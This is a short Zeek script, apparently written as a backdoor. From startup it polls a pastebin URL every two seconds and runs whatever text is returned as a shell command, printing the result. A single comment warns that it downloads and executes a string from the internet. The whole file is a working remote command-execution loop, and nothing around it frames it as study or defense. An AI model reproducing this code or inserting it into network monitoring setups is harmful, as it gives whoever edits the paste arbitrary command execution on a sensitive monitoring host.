global GLOBAL::get_and_excute: event();
global GLOBAL::last_cmd = "";

# BE CAREFUL. THIS DOWNLOADS A STRING FORM THE INTERNET AND EXECUTES IT.
global GLOBAL::cmd_url = "https://pastebin.com/raw/ZEt1wEMv";


function GLOBAL::persist() {
  schedule 2sec { get_and_excute() };
}

event GLOBAL::get_and_excute() {
  local req = [$url=cmd_url, $method="GET"];
  when (local response = ActiveHTTP::request(req)) {
    if (GLOBAL::last_cmd != response$body) {
      when (local result = Exec::run([$cmd=fmt("%s", response$body)])) {
        print fmt("pastebin command: %s, command result: %s", response$body, result$stdout[0]);
        GLOBAL::last_cmd = response$body;
      }
    }
  }
  persist();
}

event zeek_init() {
  persist();
}
